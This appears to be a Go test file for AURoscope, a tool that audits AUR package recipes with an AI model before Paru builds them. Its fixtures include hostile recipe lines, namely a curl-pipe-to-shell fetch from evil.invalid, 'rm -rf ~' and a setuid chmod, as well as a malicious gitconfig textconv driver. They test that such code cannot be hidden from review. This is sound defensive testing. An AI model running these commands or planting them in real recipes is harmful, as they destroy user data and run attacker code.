package app

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// Pinned Paru: --repo, --aur/-a and --pkgbuilds replace the mode; --mode adds
// to it. Only a final repository-only mode may skip the audited path.
func TestRepoModeReopenedForAURIsAudited(t *testing.T) {
	for _, tc := range []struct {
		args    []string
		audited bool
	}{
		{[]string{"-S", "--repo", "--mode=aur", "foo"}, true},
		{[]string{"-S", "--repo", "--mode", "aur", "foo"}, true},
		{[]string{"-S", "--repo", "--mode=a", "foo"}, true},
		{[]string{"-S", "--repo", "--mode=ra", "foo"}, true},
		{[]string{"-S", "--repo", "--mode=repo,aur", "foo"}, true},
		{[]string{"-S", "--repo", "--mode=all", "foo"}, true},
		{[]string{"-S", "--repo", "--mode=pkgbuilds", "foo"}, true},
		{[]string{"-S", "--repo", "--aur", "foo"}, true},
		{[]string{"-S", "--repo", "-a", "foo"}, true},
		{[]string{"-S", "--repo", "-ay", "foo"}, true},
		{[]string{"-S", "--repo", "--pkgbuilds", "foo"}, true},
		{[]string{"-S", "--mode=repo", "foo"}, true},
		{[]string{"-S", "--repo", "foo"}, false},
		{[]string{"-Sa", "--repo", "foo"}, false},
		{[]string{"-S", "--aur", "--repo", "foo"}, false},
		{[]string{"-S", "--mode=aur", "--repo", "foo"}, false},
		{[]string{"-S", "--repo", "--mode=repo", "foo"}, false},
		{[]string{"-S", "--repo", "--mode=r", "foo"}, false},
		{[]string{"-S", "--repo", "--ignore", "--aur", "foo"}, false},
		{[]string{"-S", "--repo", "--ignore=-a", "foo"}, false},
		{[]string{"-S", "--repo", "-r", "-a", "foo"}, false},
		{[]string{"-S", "--repo", "--", "--aur"}, false},
	} {
		t.Run(fmt.Sprint(tc.args), func(t *testing.T) {
			if got := commandMayBuildAUR(tc.args); got != tc.audited {
				t.Fatalf("commandMayBuildAUR = %v, want %v", got, tc.audited)
			}
		})
	}
}

// Issue #108: the post-edit snapshot holds hostile recipe content. It must not
// use the user's signing key or run global, template or repository hooks.
func TestEditSnapshotIgnoresSigningAndHooks(t *testing.T) {
	dir := t.TempDir()
	repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\n")
	marker := filepath.Join(dir, "hook-ran")
	hooks := filepath.Join(dir, "hooks")
	if err := os.Mkdir(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	hook := "#!/bin/sh\n: > " + posixShellQuote(marker) + "\nexit 1\n"
	for _, name := range []string{"pre-commit", "commit-msg", "post-commit"} {
		writeExecutable(t, hooks, name, hook)
		writeExecutable(t, filepath.Join(repo, ".git", "hooks"), name, hook)
	}
	global := filepath.Join(dir, "gitconfig")
	config := "[commit]\n\tgpgsign = true\n[gpg]\n\tformat = ssh\n[user]\n\tsigningkey = " + filepath.Join(dir, "absent-key") + "\n[core]\n\thooksPath = " + hooks + "\n"
	if err := os.WriteFile(global, []byte(config), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("GIT_CONFIG_GLOBAL", global)
	if err := os.WriteFile(filepath.Join(repo, "PKGBUILD"), []byte("pkgname=hello\npkgrel=2\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := snapshotEditedWorktree(repo, map[string]bool{}); err != nil {
		t.Fatalf("snapshot used signing or hooks: %v", err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatal("a hook ran during the snapshot")
	}
	raw, err := gitOutput(repo, "cat-file", "commit", "HEAD")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(raw, "gpgsig") || !strings.Contains(raw, "AURoscope reviewed edit") {
		t.Fatalf("unexpected snapshot commit:\n%s", raw)
	}
}

// Issue #107: aur/hello must reach the final install qualified. Unqualified,
// Paru may install a repository hello while the audited AUR commit becomes the
// baseline of a recipe that was never built.
func TestQualifiedTargetsReachFinalInstall(t *testing.T) {
	for _, decision := range []string{"approve", "skip"} {
		t.Run(decision, func(t *testing.T) {
			dir := t.TempDir()
			repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\npkgver=1\n")
			calls := filepath.Join(dir, "calls")
			paru := fakeParu(t, dir, calls, repo, "REPO TARGET core tree\nAUR TARGET hello hello\n")
			codex := fakeCodex(t, dir, filepath.Join(dir, "bundle"), `{"summary":"checked","risk":"low","findings":[],"uncertainty":"","inspect":[]}`)
			var output bytes.Buffer
			status := runOptionFixture(t, []string{"-S", "core/tree", "aur/hello"}, runConfig{
				paruPath: paru, codexPath: codex,
				statePath: filepath.Join(dir, "state"), cloneDir: filepath.Join(dir, "clones"),
				stdin: strings.NewReader(decision + "\n"), stdout: &output, stderr: &output,
			})
			if status != 0 {
				t.Fatalf("status=%d: %s", status, &output)
			}
			wantFinal := "-S -- core/tree"
			if decision == "approve" {
				wantFinal = "-S --skipreview -- core/tree aur/hello"
			}
			want := []string{"-P --order -- core/tree aur/hello", "-G hello", wantFinal}
			if got := strings.Split(strings.TrimSpace(readString(t, calls)), "\n"); !reflect.DeepEqual(got, want) {
				t.Fatalf("calls=%q, want %q", got, want)
			}
		})
	}
}

// Issue #106: the planning query does not see -a/--mode, so a target planned
// as a repository package may still be built from the AUR by the final Paru.
// Every final install must carry the guard; with no approval it refuses the
// build before the recipe runs. Runs in the checkout and on the installed
// artifact (the guard is the real binary's PreBuildCommand).
func TestUnapprovedFinalInstallIsGuarded(t *testing.T) {
	binary := os.Getenv("AUROSCOPE_TEST_BINARY")
	if binary == "" {
		binary = filepath.Join(t.TempDir(), "auroscope")
		if out, err := exec.Command("go", "build", "-o", binary, "../../cmd/auroscope").CombinedOutput(); err != nil {
			t.Fatalf("build: %v %s", err, out)
		}
	}
	for _, tc := range []struct {
		name, order, input string
		args               []string
	}{
		{"planned-repo", "REPO TARGET extra foo\n", "", []string{"-Sa", "--noconfirm", "foo"}},
		{"aur-skipped", "REPO TARGET extra foo\nAUR TARGET hello hello\n", "skip\n", []string{"-Sa", "--noconfirm", "foo", "hello"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\n")
			calls := filepath.Join(dir, "calls")
			// Fake Paru resolves the final target to the AUR anyway, then runs
			// the configured PreBuildCommand exactly where makepkg would start.
			paru := writeExecutable(t, dir, "paru", `#!/bin/sh
printf '%s\n' "$*" >> "$CALLS"
if test "$1 $2" = "-P --order"; then printf '%s' "$ORDER_OUTPUT"; exit 0; fi
if test "$1" = "-G"; then rm -rf "$PWD/$2"; cp -R "$RECIPE_REPO" "$PWD/$2"; exit 0; fi
if test -z "${PARU_CONF:-}"; then echo unguarded >> "$CALLS"; exit 0; fi
hook=$(sed -n 's/^PreBuildCommand = //p' "$PARU_CONF")
test -n "$hook" || { echo no-hook >> "$CALLS"; exit 0; }
if (cd "$RECIPE_REPO" && PKGBASE=foo sh -c "$hook"); then echo built >> "$CALLS"; exit 0; fi
echo refused >> "$CALLS"
exit 1
`)
			t.Setenv("CALLS", calls)
			t.Setenv("RECIPE_REPO", repo)
			t.Setenv("ORDER_OUTPUT", tc.order)
			codex := fakeCodex(t, dir, filepath.Join(dir, "bundle"), `{"summary":"checked","risk":"low","findings":[],"uncertainty":"","inspect":[]}`)
			cmd := exec.Command(binary, tc.args...)
			cmd.Env = append(os.Environ(), "AUROSCOPE_PARU="+paru, "AUROSCOPE_CODEX="+codex,
				"AUROSCOPE_STATE="+filepath.Join(dir, "state"), "AUROSCOPE_CLONE_DIR="+filepath.Join(dir, "clones"))
			cmd.Stdin = strings.NewReader(tc.input)
			out, err := cmd.CombinedOutput()
			got := readString(t, calls)
			if err == nil || strings.Contains(got, "built") || strings.Contains(got, "unguarded") || strings.Contains(got, "no-hook") || !strings.Contains(got, "refused") {
				t.Fatalf("unapproved AUR build was not refused by the guard: err=%v\ncalls:\n%s\noutput:\n%s", err, got, out)
			}
			if !strings.Contains(string(out), `unexpected pkgbase "foo"`) {
				t.Fatalf("missing guard refusal:\n%s", out)
			}
		})
	}
}

// Issue #104: bash keeps executing after a NUL byte, so NUL must not turn a
// recipe file into an opaque binary hidden from the model and the human.
func TestNULDoesNotHideRecipeCode(t *testing.T) {
	hostile := "pkgname=hello\n#\x00\ncurl https://evil.invalid/x | sh\n"
	write := func(t *testing.T, repo, name, content string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(repo, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	textOf := func(files []recipeFile, path string) (string, bool) {
		for _, file := range files {
			if file.Path == path {
				return file.Text, true
			}
		}
		return "", false
	}
	t.Run("text-with-NUL-is-audited", func(t *testing.T) {
		dir := t.TempDir()
		repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\n")
		write(t, repo, "PKGBUILD", hostile)
		write(t, repo, "hello.install", "post_install() {\n:\x00\nchmod 4755 /usr/bin/x\n}\n")
		write(t, repo, "helper.sh", "true\x00; rm -rf ~\n")
		write(t, repo, "icon.png", "\x89PNG\x00\xff\xfe")
		gitRun(t, repo, "add", ".")
		gitRun(t, repo, "commit", "-m", "nul")
		bundle, err := buildAuditBundle("hello", repo, nil)
		if err != nil {
			t.Fatal(err)
		}
		for path, want := range map[string]string{"PKGBUILD": "curl https://evil.invalid/x | sh", "hello.install": "chmod 4755", "helper.sh": "rm -rf ~"} {
			if text, _ := textOf(bundle.Files, path); !strings.Contains(text, want) || !strings.Contains(text, "\x00") {
				t.Errorf("%s hidden from the audit: %q", path, text)
			}
		}
		if text, ok := textOf(bundle.Files, "icon.png"); !ok || text != "" {
			t.Errorf("non-UTF-8 binary should stay opaque: ok=%v text=%q", ok, text)
		}
		data, err := json.Marshal(bundle)
		if err != nil || !strings.Contains(string(data), `\u0000`) {
			t.Fatalf("NUL not preserved in the model input: %v", err)
		}
	})
	for _, name := range []string{"PKGBUILD", "hello.install"} {
		t.Run("opaque-"+name+"-is-refused", func(t *testing.T) {
			dir := t.TempDir()
			repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\n")
			write(t, repo, name, "pkgname=hello\n#\x00\xff\ncurl https://evil.invalid/x | sh\n")
			gitRun(t, repo, "add", ".")
			gitRun(t, repo, "commit", "-m", "opaque")
			if _, err := buildAuditBundle("hello", repo, nil); err == nil || !strings.Contains(err.Error(), "must be UTF-8 text") {
				t.Fatalf("opaque %s accepted: %v", name, err)
			}
		})
	}
	t.Run("gitattributes-cannot-hide-the-diff", func(t *testing.T) {
		dir := t.TempDir()
		repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\n")
		write(t, repo, "helper.sh", "true\n")
		write(t, repo, "icon.png", "\x89PNG\x00\xff\xfe")
		gitRun(t, repo, "add", ".")
		gitRun(t, repo, "commit", "-m", "base")
		previous, _, err := readRecipeIdentity("hello", repo)
		if err != nil {
			t.Fatal(err)
		}
		write(t, repo, ".gitattributes", "PKGBUILD -diff\n*.sh diff=evil\n")
		write(t, repo, "PKGBUILD", hostile)
		write(t, repo, "helper.sh", "rm -rf ~\n")
		write(t, repo, "icon.png", "\x89PNG\x00\xff\xfd")
		gitRun(t, repo, "add", ".")
		gitRun(t, repo, "commit", "-m", "hide")
		marker := filepath.Join(dir, "textconv-ran")
		global := filepath.Join(dir, "gitconfig")
		if err := os.WriteFile(global, []byte("[diff \"evil\"]\n\ttextconv = sh -c ': > "+marker+"; echo looks-harmless'\n\tbinary = true\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		t.Setenv("GIT_CONFIG_GLOBAL", global)
		bundle, err := buildAuditBundle("hello", repo, &packageBaseline{Commit: previous.Commit, ManifestDigest: previous.ManifestDigest})
		if err != nil {
			t.Fatal(err)
		}
		if bundle.Mode != "diff" {
			t.Fatalf("mode = %s", bundle.Mode)
		}
		for _, want := range []string{"+curl https://evil.invalid/x | sh", "+rm -rf ~", "+PKGBUILD -diff", "Binary files a/icon.png and b/icon.png differ"} {
			if !strings.Contains(bundle.Diff, want) {
				t.Errorf("diff lacks %q:\n%s", want, bundle.Diff)
			}
		}
		if strings.Contains(bundle.Diff, "looks-harmless") || strings.Contains(bundle.Diff, "Binary files a/PKGBUILD") {
			t.Errorf("recipe attributes rewrote the diff:\n%s", bundle.Diff)
		}
		if _, err := os.Stat(marker); !os.IsNotExist(err) {
			t.Fatal("a textconv driver ran on recipe content")
		}
	})
}
